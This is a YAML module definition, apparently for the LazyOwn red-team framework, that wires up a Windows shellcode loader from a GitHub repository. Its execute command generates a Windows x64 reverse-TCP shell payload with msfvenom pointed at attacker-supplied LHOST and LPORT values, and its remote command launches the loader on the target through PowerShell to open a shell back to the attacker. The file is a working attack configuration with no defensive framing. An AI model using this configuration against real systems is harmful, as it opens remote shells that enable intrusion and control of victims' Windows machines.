name: gomulti_loader_windows
description: >
  gomulti_loader shellcode in windows and windows
author: "LazyOwn RedTeam"
version: "1.0"
enabled: true
params:
  - name: lhost
    type: string
    required: true
    description: lhost target.
  - name: lport
    type: string
    required: true
    description: lport to operate.
tool:
  name: gomulti_loader_windows
  repo_url: https://github.com/grisuno/gomulti_loader.git
  install_path: external/.exploit/gomulti_loader
  install_command: make windows
  execute_command: msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o ../../../sessions/shellcode_windows.txt ; cp loader_windows.exe ../../../sessions/
  remote_command: no_priv powershell .\loader_windows.exe -shellcode shellcode_windows.txt
